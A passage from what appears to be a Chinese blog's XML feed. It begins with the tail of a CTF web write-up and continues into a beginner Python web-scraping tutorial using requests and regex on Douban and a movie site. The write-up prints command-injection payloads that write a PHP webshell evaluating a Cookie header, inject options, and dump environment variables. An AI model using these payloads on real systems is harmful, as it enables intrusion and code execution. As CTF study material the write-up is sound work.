进行编码绕过。</li><li>然后就是这个题目使用了dump进行备份，但是mysql并没有自带的dump相关函数，所以它一定是调用了系统命令进行dump的，所以一些管道符还有<code>;</code>什么的都是可以尝试的，最后也可以使用exec进行命令执行，由于题目没有回显，所以考虑使用一句话木马到文件。</li><li>在写的时候发现过滤了$，可以通过<strong>协议头</strong>获取rce参数。ls没问题，cat可能由于权限问题得不到flag。</li><li>后来发现env环境变量中有flag信息，可能是生成靶机动态Flag的时候将Flag写入了环境变量。。。。。。。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://xxx/?db=ctf&amp;table_2_dump=flag1%0Aecho%20%22%3C?php%20@eval(getallheaders()[%27Cookie%27]&gt;)?%3E%22%20%3E%20%22/app/log/1.php%22%0A</span><br><span class="line"># echo &quot;&lt;?php eval(getallheaders()[&#x27;Cookie&#x27;])?&gt;&quot; &gt; &quot;/app/log/1.php&quot;</span><br></pre></td></tr></table></figure><ul><li>或者直接<code>?db=-r &quot;1.php&quot; &quot;&lt;?=eval(phpinfo()) ?&gt;&quot;&amp;table_2_dump=flag1</code> PHPinfo中查看环境变量get flag。</li><li>或者直接<code>?db=ctf&amp;table_2_dump=%0Aenv</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python spider</title>
      <link href="/2023/05/22/python-spider/"/>
      <url>/2023/05/22/python-spider/</url>
      
        <content type="html"><![CDATA[<p>爬虫：通过编写程序来获取互联网上的资源</p><h3 id="初始爬虫"><a href="#初始爬虫" class="headerlink" title="初始爬虫"></a>初始爬虫</h3><h4 id="爬虫入门"><a href="#爬虫入门" class="headerlink" title="爬虫入门"></a>爬虫入门</h4><p>要求：用程序模拟浏览器，输入一个网址，从该网址中获取到资源或者内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> # 1.爬虫获取百度页面信息</span><br><span class="line">from urllib.request import urlopen</span><br><span class="line"></span><br><span class="line">url = &#x27;http://www.baidu.com&#x27;</span><br><span class="line">resp = urlopen(url)</span><br><span class="line"></span><br><span class="line"># print(resp.read().decode(&quot;utf-8&quot;))</span><br><span class="line"></span><br><span class="line">with open(&#x27;mybaidu.html&#x27;, mode=&#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:      #加上 encoding=&#x27;utf-8&#x27;，以utf-8写入文件，否则默认gbk(windows默认gbk)写入，就会乱码</span><br><span class="line">    f.write(resp.read().decode(&quot;utf-8&quot;))    # 获取网页源代码</span><br><span class="line">print(&#x27;ok!&#x27;)</span><br></pre></td></tr></table></figure><h4 id="web请求过程剖析"><a href="#web请求过程剖析" class="headerlink" title="web请求过程剖析"></a>web请求过程剖析</h4><ul><li>1. 服务器渲染：在服务器那边把数据和html整合在一起，统一返回给浏览器 注： 在页面源代码中，看得到数据</li><li>2. 客户端渲染： 第一次请求只要一个html骨架，第二次请求拿到数据，并进行数据展示注：在页面源代码中，看不到数据</li></ul><h4 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h4><p><strong>请求头</strong>中常见的一些重要内容（爬虫需要）</p><ul><li>User-agent ： 请求载体的身份标识（用啥发送的请求）</li><li>Referer ： _防盗链_（这次请求是从哪个页面来的？反爬会用到）</li><li>cookie ： 本地字符串数据信息（用户登录信息，反爬的token）</li></ul><p><strong>响应头</strong>中的一些重要内容：</p><ul><li>cookie ： 本地字符串数据信息（用户登录信息，反爬的cookie）</li><li>各种神奇的莫名其妙的字符串（这个需要经验了，一般都是token字样，防止各种攻击和反爬）</li></ul><h4 id="requests入门"><a href="#requests入门" class="headerlink" title="requests入门"></a>requests入门</h4><p>requests不是python自带的模块，需要自行安装</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230107061032489-1024x253.png" style="zoom: 67%;" /><p>在pycharm里面自带的terminal执行命令<code>pip install requests</code> 注意，如果pip命令执行不了，就是环境变量没配置好，或者python版本太低，建议用python3.8</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230107061755167.png" style="zoom:67%;" /><p>什么也不加，就<code>print(resp)</code>就会返回状态码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"> # &#x27;Accept&#x27;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;,</span><br><span class="line"> # &#x27;Accept-Language&#x27;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line"> &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot;,</span><br><span class="line"> # &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line"> &#x27;cookie&#x27;: &#x27;***&#x27;     #cookie加上才能爬出来，否则被ban，cookie最好看bp里面的，浏览器上的格式啥的可能不对。</span><br><span class="line"> &#125;</span><br><span class="line">url = &#x27;https://www.baidu.com/s?wd=aimer&#x27;</span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line">print(resp)</span><br><span class="line">print(resp.content.decode(&#x27;utf-8&#x27;))  #拿到页面源代码</span><br></pre></td></tr></table></figure><h4 id="爬取百度翻译数据"><a href="#爬取百度翻译数据" class="headerlink" title="爬取百度翻译数据"></a>爬取百度翻译数据</h4><p>在百度翻译里面输入dog查询，network里面有一个包</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230107214041509-1024x208.png" style="zoom:67%;" /><p>效应数据就是想要的翻译：</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230107214112292.png" style="zoom:67%;" /><p>也就是说，<code>url=‘https://fanyi.baidu.com/sug’</code></p><p>请求，kw&#x3D;’dog’</p><p>响应就是需要的数据</p><p>用python实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">serc = input(&#x27;请输入你要翻译的单词：&#x27;.strip())</span><br><span class="line">url = &#x27;https://fanyi.baidu.com/sug&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;kw&#x27;: serc</span><br><span class="line">&#125;</span><br><span class="line">#发送post请求，发送的数据必须在字典中，通过data传递</span><br><span class="line">resp = requests.post(url, data=data)</span><br><span class="line">print(resp.json())   #将服务器返回的内容直接处理成json() =&gt; dict</span><br></pre></td></tr></table></figure><p>同理，爬取豆瓣排行榜信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#爬取豆瓣排行榜信息</span><br><span class="line">import requests</span><br><span class="line">url = &#x27;https://movie.douban.com/j/chart/top_list&#x27;</span><br><span class="line">params = &#123;</span><br><span class="line">    &#x27;type&#x27;: &#x27;24&#x27;,</span><br><span class="line">    &#x27;interval_id&#x27;: &#x27;100:90&#x27;,</span><br><span class="line">    &#x27;action&#x27;: &#x27;0&#x27;,                             #把get参数重新封装一下</span><br><span class="line">    &#x27;start&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;limit&#x27;: &#x27;20&#x27;</span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&#x27;              #一般加上UA否则可能会被反爬</span><br><span class="line">&#125; </span><br><span class="line">resp = requests.get(url, params=params, headers=headers)</span><br><span class="line">print(resp.json())</span><br><span class="line">resp.close()             #关掉这个response，否则可能请求次数过多，后期会出现一些问题</span><br></pre></td></tr></table></figure><h4 id="补：编码与文件读写"><a href="#补：编码与文件读写" class="headerlink" title="补：编码与文件读写"></a>补：编码与文件读写</h4><p>编码：</p><p>encode() -&gt;编码，把汉字编码成字符</p><p>decode() -&gt; 解码，把字符解码成为汉字</p><h3 id="数据解-析概述"><a href="#数据解-析概述" class="headerlink" title="数据解 析概述"></a>数据解 析概述</h3><p>大多数情况下我们不需要所有的数据，而只需要数据里面的很少一部分，这就涉及到数据提取问题。</p><p>主要有三种解析方式：</p><ul><li>re解析 （效率高） re -》regular expression[正则]</li><li>bs4解析 （速度快）</li><li>xpath解析 （流行）</li></ul><h4 id="re解析"><a href="#re解析" class="headerlink" title="re解析"></a>re解析</h4><h5 id="Regular-Expression-re"><a href="#Regular-Expression-re" class="headerlink" title="Regular Expression(re)"></a>Regular Expression(re)</h5><p>正则表达式：元字符+量词</p><p>元字符：具有固定含义的特殊符号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.     匹配换行符以外的任意字符</span><br><span class="line">\w    匹配数字字母下划线</span><br><span class="line">\s    匹配任意空白符</span><br><span class="line">\d    匹配数字</span><br><span class="line">\n    匹配一个换行符</span><br><span class="line">\t    匹配一个制表符</span><br><span class="line"></span><br><span class="line">^    匹配字符串的开始</span><br><span class="line">$    匹配字符串的结尾</span><br><span class="line"></span><br><span class="line">\W   匹配非字母数字下划线</span><br><span class="line">\D   匹配非数字</span><br><span class="line">\S   匹配非空白符</span><br><span class="line"></span><br><span class="line">ab  匹配字符a或者字符b</span><br><span class="line">()   匹配括号内的表达式，也表示一个组</span><br><span class="line">[..] 匹配字符组中的字符</span><br><span class="line">[^..]匹配除了字符组中字符的所有字符</span><br></pre></td></tr></table></figure><p>量词：控制前面的元字符出现的次数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*     重复零次或者更多次</span><br><span class="line">+     重复一次或者更多次</span><br><span class="line">?     重复零次或者一次</span><br><span class="line">&#123;n&#125;   重复n次</span><br><span class="line">&#123;n,&#125;  重复n次或者更多次</span><br><span class="line">&#123;n,m&#125; 重复n到m次</span><br></pre></td></tr></table></figure><p><strong>贪婪匹配和惰性匹配</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.*    贪婪匹配</span><br><span class="line">.*?   惰性匹配         有种负负得正的感觉     </span><br></pre></td></tr></table></figure><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">玩儿吃鸡游戏，什么游戏最好玩，吃鸡游戏最好玩！</span><br><span class="line"></span><br><span class="line">匹配   玩儿.?游戏    可能有以下结果</span><br><span class="line">玩儿吃鸡游戏</span><br><span class="line">玩儿吃鸡游戏，什么游戏</span><br><span class="line">玩儿吃鸡游戏，什么游戏最好玩，吃鸡游戏</span><br><span class="line"></span><br><span class="line">那么：</span><br><span class="line"> .*?   惰性匹配             中间匹配字符尽可能少，所以匹配第一个</span><br><span class="line"> .*    贪婪匹配             中间匹配字符尽可能多，所以匹配最后一个</span><br></pre></td></tr></table></figure><h5 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h5><p>在python中使用正则表达式，需要借助re模块</p><p>re模块有以下这些功能需要了解：</p><ul><li>findall 查找所有，返回list</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">lst = re.findall(&quot;m&quot;, &quot;moi le fo len,moi ni mei!&quot;)</span><br><span class="line">print(lst)   #[&#x27;m&#x27;, &#x27;m&#x27;, &#x27;m&#x27;]</span><br><span class="line">lst = re.findall(r&quot;\d+&quot;,&#x27;5点之前，你要给我5000万！&#x27;)</span><br><span class="line">print(lst)   #[&#x27;5&#x27;, &#x27;5000&#x27;]</span><br></pre></td></tr></table></figure><ul><li>search 会进行匹配，但是如果匹配到了第一个结果，就会返回这个结果，如果匹配不上就会返回none</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#search返回的也是match对象，需要.group()来拿数据;   并且只会返回一个数据</span><br><span class="line">import re</span><br><span class="line">s = re.search(r&quot;\d+&quot;,&#x27;5点之前，你要给我5000万！&#x27;)</span><br><span class="line">print(s.group())</span><br></pre></td></tr></table></figure><ul><li>match 只能从字符串的开头进行匹配</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#match 只能从头匹配并且返回的也是match对象，需要.group()来拿数据</span><br><span class="line">import re</span><br><span class="line">s = re.match(r&quot;\d+&quot;, &#x27;5点之前，你要给我5000万！&#x27;)</span><br><span class="line">print(s.group())</span><br></pre></td></tr></table></figure><ul><li>finditer，和findall差不多，只不过返回的是<strong>迭代器</strong>（重点）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#finditer:匹配字符串中所有内容[返回迭代器]，要从迭代器中拿到内容，需要 .group()</span><br><span class="line">   import re</span><br><span class="line">   it = re.finditer(r&quot;\d+&quot;,&#x27;5点之前，你要给我5000万！&#x27;)</span><br><span class="line">   for i in it:</span><br><span class="line">       print(i.group())</span><br></pre></td></tr></table></figure><ul><li>预加载正则表达式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">obj = re.compile(r&quot;\d+&quot;)          #预先加载这个正则表达式，可能会效率更高一点</span><br><span class="line">ret = obj.finditer(&#x27;5点之前，你要给我5000万！&#x27;)</span><br><span class="line">for i in ret:</span><br><span class="line">    print(ret.group())</span><br></pre></td></tr></table></figure><ul><li>从正则中进一步提取内容 格式 ： <code>(?P&lt;分组名字&gt;正则匹配式)</code> 可以单独从正则匹配的内容中进一步提取内容</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">s = &#x27;&#x27;&#x27;          #\&#x27;&#x27;&#x27;可以换行写语句，而不用 /</span><br><span class="line">&lt;div class= &#x27;jay&#x27;&gt;&lt;span id= &#x27;1&#x27;&gt;哈哈哈&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class= &#x27;jj&#x27;&gt;&lt;span id= &#x27;2&#x27;&gt;呵呵呵呵&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class= &#x27;jony&#x27;&gt;&lt;span id= &#x27;3&#x27;&gt;嘿嘿&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class= &#x27;jan&#x27;&gt;&lt;span id= &#x27;4&#x27;&gt;略略略略略&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># obj = re.compile(r&quot;&lt;div class= &#x27;.*?&#x27;&gt;&lt;span id= &#x27;\d&#x27;&gt;.*?&lt;/span&gt;&lt;/div&gt;&quot;,re.S)</span><br><span class="line"># re.S是一种flags，作用是让.可以匹配换行符【防止源码有换行之类的情况】</span><br><span class="line">#上面这种写法可以匹配一整个html标签，但我们只想要后面的内容</span><br><span class="line">obj = re.compile(r&quot;&lt;div class= &#x27;.*?&#x27;&gt;&lt;span id= &#x27;\d&#x27;&gt;(?P&lt;语气词&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;,re.S)</span><br><span class="line">result = obj.finditer(s)</span><br><span class="line">for it in result:</span><br><span class="line">    print(it.group(&#x27;语气词&#x27;))</span><br></pre></td></tr></table></figure><h5 id="re模块实战"><a href="#re模块实战" class="headerlink" title="re模块实战"></a>re模块实战</h5><h6 id="爬取豆瓣排行榜top250"><a href="#爬取豆瓣排行榜top250" class="headerlink" title="爬取豆瓣排行榜top250"></a>爬取豆瓣排行榜top250</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import csv</span><br><span class="line">for i in range(0, 10):</span><br><span class="line">    pages = 25 * i</span><br><span class="line">    url = &#x27;https://movie.douban.com/top250?start=&#x27;+str(pages)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;Cookie&#x27;: &#x27;bid=8UHUa3t6pKo; douban-fav-remind=1; __gads=ID=e7fe6811345277f9-22334e02c7d800b1:T=1670572592:RT=1670572592:S=ALNI_MZUJr_wSNzn771scrDXrECeoFN_SQ; __gpi=UID=00000b8ccfe9bf56:T=1670572592:RT=1673171396:S=ALNI_MadQPKn4grfVwodxBoEiw3Cune7sg; __utma=30149280.547815370.1670572596.1673113847.1673171401.4; __utmz=30149280.1673109963.2.2.utmcsr=cn.bing.comutmccn=(referral)utmcmd=referralutmcct=/; ll=&quot;118318&quot;; _pk_ref.100001.4cf6=%5B%22%22%2C%22%22%2C1673171400%2C%22https%3A%2F%2Fwww.douban.com%2F%22%5D; _pk_id.100001.4cf6=dd7c66dd3123a3b3.1673109976.3.1673171400.1673113847.; __utma=223695111.508457728.1673109977.1673113847.1673171401.3; __utmz=223695111.1673109977.1.1.utmcsr=douban.comutmccn=(referral)utmcmd=referralutmcct=/; __yadk_uid=Sb30wsdUmpnizO3OWCQCUIUdU3GLTcu6; __utmc=30149280; __utmc=223695111; ap_v=0,6.0&#x27;,</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url, headers=headers)</span><br><span class="line">    s = resp.content.decode(&#x27;utf-8&#x27;)</span><br><span class="line">    #print(s)</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">     &lt;div class=&quot;pic&quot;&gt;</span><br><span class="line">                        &lt;em class=&quot;&quot;&gt;1&lt;/em&gt;</span><br><span class="line">                        &lt;a href=&quot;https://movie.douban.com/subject/1292052/&quot;&gt;</span><br><span class="line">                            &lt;img width=&quot;100&quot; alt=&quot;肖申克的救赎&quot; src=&quot;https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/p480747492.jpg&quot; class=&quot;&quot;&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    #obj = re.compile(r&#x27;&lt;div class=&quot;pic&quot;&gt;.*?&lt;em class=&quot;&quot;&gt;(?P&lt;id&gt;\d)&lt;/em&gt;.*?&lt;a href=&quot;./*&quot;&gt;.*?&lt;img width=&quot;\d&quot; alt=&quot;(?P&lt;name&gt;.*?)&quot; src=&quot;.*?&quot; class=&quot;&quot;&gt;.*?&lt;/a&gt;.*?&lt;/div&gt;&#x27;, re.S)</span><br><span class="line">    obj = re.compile(r&#x27;&lt;div class=&quot;pic&quot;&gt;.*?&lt;em class=&quot;&quot;&gt;(?P&lt;id&gt;\d+)&lt;/em&gt;.*?&lt;a href=.*?alt=&quot;(?P&lt;name&gt;.*?)&quot;.*?&lt;/div&gt;&#x27;, re.S)</span><br><span class="line">    result = obj.finditer(s)</span><br><span class="line">#导入CSV文件中，方便后续查找</span><br><span class="line">    f = open(&#x27;douban.csv&#x27;, mode=&#x27;a&#x27;)</span><br><span class="line">    csvwriter = csv.writer(f)</span><br><span class="line">    for it in result:</span><br><span class="line">        #print(it.group(&#x27;id&#x27;)+&#x27;-&gt;&#x27;+it.group(&#x27;name&#x27;), end=&#x27;\t&#x27;)</span><br><span class="line">        dic = it.groupdict()</span><br><span class="line">        dic[&#x27;id&#x27;] = it.group(&#x27;id&#x27;).strip()</span><br><span class="line">        dic[&#x27;name&#x27;] = it.group(&#x27;name&#x27;).strip()</span><br><span class="line">        csvwriter.writerow(dic.values())</span><br><span class="line">f.close()</span><br><span class="line">print(&#x27;over!&#x27;)</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>每一页是一个url，需要找规律然后遍历所有url，才能爬到所有的页码</li><li>正则可以多找一点然后中间不重要的就 <code>.*?</code> (换行符之类的不清楚的也这样)</li><li>加入文件读写要注意！ <a href="https://blog.csdn.net/album_gyd/article/details/89630708">https://blog.csdn.net/album_gyd&#x2F;article&#x2F;details&#x2F;89630708</a> 相关博客</li><li><strong>注意注意，每一次循环都是从当前文件追加内容，mode是a不是w</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230108222632061-1024x127.png"></p><h6 id="爬取电影天堂信息"><a href="#爬取电影天堂信息" class="headerlink" title="爬取电影天堂信息"></a>爬取电影天堂信息</h6><p>思路：在主页中找到目标电影-&gt;进入其子页面-&gt;拿到子页面里面的电影名下载链接等信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">url0 = &#x27;https://www.dytt89.com/&#x27;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Cookie&#x27;:&#x27;Hm_lvt_93b4a7c2e07353c3853ac17a86d4c8a4=1673189156; Hm_lpvt_93b4a7c2e07353c3853ac17a86d4c8a4=1673189156; Hm_lvt_8e745928b4c636da693d2c43470f5413=1673189156; Hm_lpvt_8e745928b4c636da693d2c43470f5413=1673189156; Hm_lvt_0113b461c3b631f7a568630be1134d3d=1673189156; Hm_lpvt_0113b461c3b631f7a568630be1134d3d=1673189156&#x27;,</span><br><span class="line">    &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line">resp0 = requests.get(url0, headers=headers, verify=False)  #去掉安全验证</span><br><span class="line">s0 = resp0.content.decode(&#x27;gbk&#x27;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;&lt;div class=&quot;co_area2&quot; style=&quot;float:left;width:470px;height:auto;overflow:hidden;margin-left:6px;&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;title_all&quot;&gt;&lt;p&gt;&lt;span style=&quot;float:left;&quot;&gt;2023必看热片&lt;/span&gt;&lt;em style=&quot;float:right;&quot;&gt;&lt;a href=&quot;/html/bikan/&quot;&gt;更多&gt;&gt;&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;co_content222&quot;&gt;</span><br><span class="line">                    &lt;ul&gt;</span><br><span class="line">                        &lt;li&gt;&lt;a href=&#x27;/i/106759.html&#x27; title=&quot;2022年国产冒险灾难片《搜救》HD国语中字&quot;&gt;2022年国产冒险灾难片《搜救》HD国语中字&lt;/a&gt;&lt;span&gt;&lt;font color=#FF0000&gt;11-06&lt;/font&gt;&lt;/span&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&#x27;/i/105464.html&#x27; title=&quot;2022年美国动作犯罪片《亡命救护车》蓝光中英双字&quot;&gt;2022年美国动作犯罪片《亡命救护车》蓝光中英双字&lt;/a&gt;&lt;span&gt;&lt;font color=#FF0000&gt;11-03&lt;/font&gt;&lt;/span&gt;&lt;/li&gt;&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">#这个一次查询出来很困难，因为要掐头去尾，所以选择筛选两次！</span><br><span class="line">obj0 = re.compile(r&#x27;&lt;div class=&quot;co_area2&quot; .*?2023必看热片&lt;/span&gt;.*?&lt;ul&gt;(?P&lt;s1&gt;.*?&lt;/ul&gt;)&#x27;, re.S)</span><br><span class="line">s1 = obj0.findall(s0)</span><br><span class="line">#print(type(s1))     #list</span><br><span class="line">#print(type(&#x27;&#x27;.join(s1).strip())) #str</span><br><span class="line">s2 = &#x27;&#x27;.join(s1).strip()</span><br><span class="line">obj1 = re.compile(r&quot;&lt;li&gt;&lt;a href=&#x27;(?P&lt;url&gt;.*?)&#x27; title=.*?&lt;/font&gt;&lt;/span&gt;&lt;/li&gt;&quot;, re.S)</span><br><span class="line">result1 = obj1.finditer(s2)</span><br><span class="line">for it in result1:</span><br><span class="line">    x = it.group(&#x27;url&#x27;)</span><br><span class="line">    url1 = url0+x</span><br><span class="line">    #print(url1)</span><br><span class="line">    headers = &#123;</span><br><span class="line">      &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    resp1 = requests.get(url1, headers=headers, verify=False)</span><br><span class="line">    s3 = resp1.content.decode(&#x27;gbk&#x27;)</span><br><span class="line">    obj2 = re.compile(r&#x27;片　　名(?P&lt;name&gt;.*?)&lt;br /&gt;.*?&lt;li&gt;&lt;a href=&quot;(?P&lt;href&gt;.*?)&quot;&gt;.*?&lt;/a&gt;&lt;/li&gt;&#x27;, re.S)</span><br><span class="line">    result3 = obj2.finditer(s3)</span><br><span class="line">    for it in result3:</span><br><span class="line">        print(it.group(&#x27;name&#x27;)+&#x27;-&gt;&#x27;+it.group(&#x27;href&#x27;))</span><br></pre></td></tr></table></figure><ul><li>报错<code>Adding certificate verification is strongly advised</code>，需要：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 